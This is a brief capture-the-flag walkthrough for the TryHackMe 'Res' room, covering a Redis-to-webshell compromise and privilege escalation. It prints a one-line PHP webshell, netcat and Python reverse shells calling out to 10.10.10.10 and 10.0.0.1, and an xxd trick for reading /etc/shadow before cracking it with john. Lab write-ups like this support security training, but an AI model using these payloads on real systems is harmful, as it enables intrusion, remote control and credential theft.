# [Res](https://tryhackme.com/room/res)


### Task 5 Compromise the machine and locate user.txt
0. [HackTricks Webshell](https://book.hacktricks.xyz/pentesting/6379-pentesting-redis#webshell)
1. Apache writeable path `/var/www/html`
2. Connecting via `redis-cli` or `netcat`
```
redis-cli -h $ip
nc -vn $ip $port
```
3. Then one line php webshell `"<?php system($_GET['cmd']); ?>"` or maybe try this `<?php exec("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 4242 >/tmp/f")?>`

### Task 6 What is the local user account password?
1. First get a reverse shell from webshell. `python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'`
2. Run `Linpeas.sh` found the intersting file `xxd`. https://gtfobins.github.io/gtfobins/xxd/
3. [Expand Knowledge](https://github.com/A1vinSmith/OSCP-PWK/wiki/Linux#file-read)
```
LFILE=/etc/shadow
xxd "$LFILE" | xxd -r
```
4. Crack the password with john. `su user` then `sudo su` get the root
